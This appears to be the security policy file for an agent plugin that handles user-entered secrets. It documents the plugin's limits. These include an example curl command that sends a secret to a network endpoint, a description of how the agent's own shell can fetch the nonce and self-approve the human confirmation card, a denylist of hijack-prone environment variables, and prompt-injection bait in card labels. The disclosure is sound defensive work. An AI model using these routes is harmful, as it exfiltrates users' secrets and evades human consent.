# Security policy

## Supported versions

| version | supported |
| --- | --- |
| 0.2.x | yes |
| 0.1.x | security fixes only |

## Reporting a vulnerability

Do **not** open a public issue for a security problem. Use the repository's
**Security → Advisories → Report a vulnerability** flow (GitHub private security
advisory). If that is unavailable, contact the maintainer through the repository
owner's profile and ask for a private channel first.

Please include:

- plugin version (`plugin.json` → `version`) and host version (`qwenpaw --version`)
- a minimal reproduction using **dummy** values (`DUMMY-SK-abcdef123456`), never a
  real credential
- which invariant you believe is broken (see below) and the observed output

You will get an acknowledgement, a severity assessment, and a fix or mitigation
plan. Please give the maintainer time to ship a release before public disclosure.

## What this plugin promises

Inbound confidentiality: a value submitted through the answer card must not appear
in tool arguments, tool results, the chat transcript, session memory, host logs,
exception strings, or host disk artifacts (`tool_results/*.txt`, dialog JSONL).
The value travels only in the `POST /api/secret-input/card/{id}/answer` body.

Outbound scrubbing is **best-effort, not a sandbox** (see the README threat model).
Reports that require defeating same-uid process isolation, memory forensics, or
encoded/split output are documented residual risks, not vulnerabilities.

Consent for spending a ref: with `require_consume_approval` (default `true`),
`secret_exec` and `secret_export` open a confirmation card showing the exact
command/cwd or env key and wait for a human decision. This is a **visibility and
consent gate, not a security boundary** — see "Known, deliberate exposures".

Two carve-outs from the outbound promise are stated plainly because they are easy
to miss: values **shorter than 8 characters are never registered for scrubbing**
(`backend/scrub.py` → `_MIN_VALUE_CHARS`), so a short password can reach `stdout`
verbatim; and a `{{secret}}` marker substituted into a command line lands in the
child's `argv` (below).

## Known, deliberate exposures

- `secret_export` persists the value into the host's encrypted env store and the
  process environment. Later tools (and a same-uid agent) can read it with
  `printenv`. Use `secret_exec` for one-shot use.
- **`{{secret}}` in a command line exposes the value to every local user.** The
  substituted command becomes the child's `argv`; `/proc/<pid>/cmdline` is mode
  `0444` (world-readable) for the child's whole lifetime, and the same text lands
  in `ps` output, auditd `EXECVE` records and process accounting. That is wider
  than the same-uid exposure above. Prefer `$<env_name>` — the value then travels
  in the child's environment, which other local users cannot read. The plugin
  cannot fix this itself: it is inherent to how a shell command receives an
  inline value.
- **The `secret_export` env-key denylist is not a security boundary.** It blocks
  20 host-critical names (`PATH`, `LD_PRELOAD`, `GIT_SSH_COMMAND`, `BASH_ENV`, …)
  to prevent accidentally bricking the host or planting a cross-restart hijack.
  It cannot be complete for the class "environment names that cause code
  execution", and the model already has arbitrary execution through
  `secret_exec` — so treat "not on the list" as "not obviously self-destructive",
  never as "safe".
- A same-host agent can answer the card before the human does and make the plugin
  store a fabricated value. The plugin records and displays the answering peer and
  timestamp so the human can notice; it cannot prevent this at the HTTP layer.
- **The host does not gate plugin tools, and the confirmation card can approve
  itself.** On QwenPaw 2.2.2 (measured 2026-10-21) `secret_exec` ran with no host
  approval prompt — `/api/approval/list` stayed empty throughout. The plugin's
  confirmation card is therefore the only gate before a ref is spent, and the
  same loopback caller (including the agent's own shell) can read `/pending`,
  fetch the nonce from `/card/{id}/meta`, and `POST /answer {"approve": true}`.
  The card makes model-authored actions visible and lets a human deny them; it
  does not stop an agent that deliberately evades the human. Set
  `require_consume_approval=false` only when commands are reviewed elsewhere.
- **`secret_exec` is an exfiltration primitive.** The command is written by the
  model, so the value can be sent to any network endpoint (`curl -d "$SECRET"
  https://…`) or written to a file. The scrub middleware covers what the model
  *sees* — including reading that file back with another tool — but a network send
  leaves the machine before any scrubbing runs. It cleans what the model sees, not
  what it sends out. Review the exact command before letting an agent spend a ref.
- The card's `label`/`reason` are written by the model and can carry
  prompt-injection bait aimed at the human. They are rendered as untrusted text.

## Scope of the access gate

The four `/api/secret-input` endpoints accept a loopback TCP peer or an
authenticated caller (`request.state.user`). `allow_remote=true` disables that
gate entirely — including the loopback-only rule on the bare `/pending` list (no
`session_id`). Do not enable it on a host exposed to an untrusted network.
